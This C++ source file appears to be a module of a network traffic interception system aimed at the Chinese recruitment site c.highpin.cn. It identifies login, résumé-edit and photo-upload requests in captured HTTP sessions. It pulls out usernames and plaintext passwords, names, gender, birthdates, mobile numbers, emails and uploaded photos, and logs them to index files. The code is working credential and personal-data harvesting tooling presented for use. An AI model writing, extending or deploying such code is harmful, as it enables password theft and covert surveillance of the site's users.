#include "StdAfx.h"
#include "EmployZhiLianZhaoPin.h"
#include "../BoundaryParser.h"

employ::ZhiLianZhaoPin::ZhiLianZhaoPin(HttpSession *http_session, const string &pro_name) : Employ(http_session,pro_name)
{
	app_ = "智联卓聘";
}

employ::ZhiLianZhaoPin::~ZhiLianZhaoPin()
{
	
}

int employ::ZhiLianZhaoPin::IsZhiLianZhaoPin(HttpSession *http_session)
{
	//智联卓聘登录
	if (http_session->m_Requestline.m_Host.Find("c.highpin.cn") != -1 &&
		http_session->m_Requestline.m_URI.Find("/Users/CLogin") != -1)
	{
        return kPcWebLogin;
	}
	//智联卓聘个人信息(新建/修改)
	if((http_session->m_Requestline.m_Host.Find("c.highpin.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/Resumes/SaveResumeInfo/")!=-1) )
	{
		return kPcWebInfo;
	}
	//上传头像
	if((http_session->m_Requestline.m_Host.Find("c.highpin.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/Handler/SeekerPhotoReceiver.ashx")!=-1) )
	{
		return kPcWebPaPhoto;
	}
	return 0;
}

int employ::ZhiLianZhaoPin::Process(const char *packet,int action)
{
	if (action == kPcWebLogin)
	{
		return PcWebLogin(packet);
	}
	if (action== kPcWebInfo)
	{
		return PcWebInfo(packet);
	}
	if (action == kPcWebPaPhoto)
	{
		return PcWebPaPhoto(packet);
	}
	return 1;
}

int employ::ZhiLianZhaoPin::PcWebLogin(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UrlDecode(src_data);
	ms_->SplitStringToMap(src_data,"&","=");
	//用户名
	string username = ms_->GetValueFromMapByKey("Logon_UserEmail",true);
	//密码
	string pass = ms_->GetValueFromMapByKey("Logon_Password",true);
	if (username.empty() || pass.empty())
	{
		return 0;
	}
	output_text_=
		"user=" + 	username + "\r\n" +	//账号			 
		"pass=" + 	pass + "\r\n" + 	//密码	
		"netmark=" + app_ + "\r\n" + 	//来源
		"state=登录\r\n";  
		WriteIndexFile();
	return 0;
}
int employ::ZhiLianZhaoPin::PcWebInfo(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,"&","=");
	string ResumeID = ms_->GetValueFromMapByKey("ResumeID");
	//智联卓聘修改个人信息
	if (atoi(ResumeID.c_str()) > 0)
	{
		//姓名   
        string name = ms_->GetValueFromMapByKey("Name");
		//性别 
		string gender = ms_->GetValueFromMapByKey("Gender");
		if (gender == "1")
		{
			gender = "男";
		}
		if (gender == "2")
		{
			gender = "女";
		}
		//出生日期 
		string birthdate = ms_->GetValueFromMapByKey("Birthday");
        //手机号
		string mobile = ms_->GetValueFromMapByKey("Mobile");
		//邮箱
		string loginemail = ms_->GetValueFromMapByKey("LogonEmail");

		if (name.empty() || gender.empty())
		{
			return 0;
		}
		output_text_=	
			"servername=" + name + "\r\n" +		 //姓名	       
			"sex=" + 	 gender + "\r\n" + 		 //性别	
			"msg=" + 	 birthdate + "\r\n" + 	 //出生日期	
			"oid=" + 	mobile + "\r\n" + 	     //手机号		
			"mid=" + 	loginemail + "\r\n" + 	 //邮箱	
			"netmark=" + app_ + "\r\n" + 		 //来源
			"state=修改个人信息\r\n";  
		WriteIndexFile();
	}
    else
	{
		//姓名   
        string name = ms_->GetValueFromMapByKey("Name");
		//性别 
		string gender = ms_->GetValueFromMapByKey("Gender");
		if (gender == "1")
		{
			gender = "男";
		}
		if (gender == "2")
		{
			gender = "女";
		}
		//出生日期 
		string birthdate = ms_->GetValueFromMapByKey("Birthday");
        //手机号
		string mobile = ms_->GetValueFromMapByKey("Mobile");
		//邮箱
		string loginemail = ms_->GetValueFromMapByKey("LogonEmail");
		
		if (name.empty() || gender.empty())
		{
			return 0;
		}
		output_text_=	
			"servername=" + name + "\r\n" +		 //姓名	       
			"sex=" + 	 gender + "\r\n" + 		 //性别	
			"msg=" + 	 birthdate + "\r\n" + 	 //出生日期	
			"oid=" + 	mobile + "\r\n" + 	     //手机号		
			"mid=" + 	loginemail + "\r\n" + 	 //邮箱	
			"netmark=" + app_ + "\r\n" + 		 //来源
			"state=新建个人信息\r\n";  
		WriteIndexFile();
	}
	return 1;
}

//上传头像
int employ::ZhiLianZhaoPin::PcWebPaPhoto(const char *packet)
{	
	from_ = "智联卓聘";
	//文件部分
	string boundary(http_session_->m_Requestline.m_strBoundary.GetBuffer(0));	
	BoundaryParser bp;
	bp.Parse(packet, http_session_->m_datalen, boundary); 
	BoundaryValue *bv = NULL;
	string key;
	key = bp.GetBoundaryKey("name=\"photofile\"");          
	bv = bp.GetBoundaryValue(key);	
	if (bv == NULL || key.empty())
	{
		return 0;
	}
	attachment_ = ms_->GetValueBetweenBeginEnd(key, "filename=\"", "\"", true);	
	if (attachment_.empty()){ return 0;	}
	string real_file_name = WriteTempRealFile(bv->ptr,attachment_.c_str(),bv->len);
	ConstructUploadAttachmentOuptputString();
	WriteIndexFile(real_file_name);
	return 1;
}